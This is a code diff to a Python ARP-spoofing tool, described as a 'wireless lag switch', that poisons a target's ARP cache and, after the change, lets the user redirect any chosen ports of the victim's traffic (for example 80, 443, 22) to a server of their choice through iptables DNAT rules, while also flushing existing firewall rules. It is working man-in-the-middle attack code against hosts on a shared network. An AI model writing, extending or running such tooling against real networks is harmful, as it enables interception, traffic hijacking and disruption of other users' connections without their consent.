@@ -15,7 +15,6 @@ gateway = ipr[2]
 interface = ipr[4]
 arp_thread = None
 target = None
-proxy_server = '192.168.2.9'
 
 def enable_ip_forwarding():
     with open('/proc/sys/net/ipv4/ip_forward', 'w') as fr:
@@ -33,14 +32,14 @@ def disable_ip_forwarding():
             sys.exit(1)
 
 
-def set_iptables(ip):
-    os.system("/sbin/iptables --flush")
-    os.system("/sbin/iptables -t nat --flush")
-    os.system("/sbin/iptables --zero")
+def set_iptables(ip, proxy_server=None, ports=None):
+    os.system("/sbin/iptables -F")
+    os.system("/sbin/iptables -t nat -F")
+    os.system("/sbin/iptables -X")
     os.system("/sbin/iptables -A FORWARD --in-interface %s -j ACCEPT" % interface)
     os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface %s -j MASQUERADE" % interface)
-    #This will forward port 80 to whatever server you want
-    os.system("/sbin/iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination %s" % proxy_server)
+    if proxy_server:
+        os.system("/sbin/iptables -t nat -A PREROUTING -p tcp -m multiport --dports %s --jump DNAT --to-destination %s" % (ports, proxy_server))
 
 
 def get_MAC(ip):
@@ -70,6 +69,8 @@ if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(description='arpspoof.py - Acts a wireless lag switch')
     parser.add_argument('-t', '--target', dest='target_ip', type=str, required=False, help="IP Address of target")
+    parser.add_argument('-s', '--server', dest='server', type=str, required=False, help="IP Address of Server to forward traffic")
+    parser.add_argument('-p', '--ports', dest='ports', type=str, required=False, help="Ports to forward to Server. Example: 80,443,22")
     args = parser.parse_args()
 
     if os.geteuid() != 0:
@@ -84,14 +85,15 @@ if __name__ == "__main__":
     else:
         target = args.target_ip
 
-    set_iptables(args.target_ip)
+    set_iptables(args.target_ip, args.server, args.ports)
 
     def signal_handler(signal, frame):
         disable_ip_forwarding()
         arp_restore(gateway, target)
-        os.system("/sbin/iptables --flush")
-        os.system("/sbin/iptables -t nat --flush")
-        os.system("/sbin/iptables --zero")
+        os.system("/sbin/iptables -F")
+        os.system("/sbin/iptables -t nat -F")
+        os.system("/sbin/iptables -t nat -X")
+        os.system("/sbin/iptables -X")
         sys.exit(0)    
     signal.signal(signal.SIGINT, signal_handler)
 
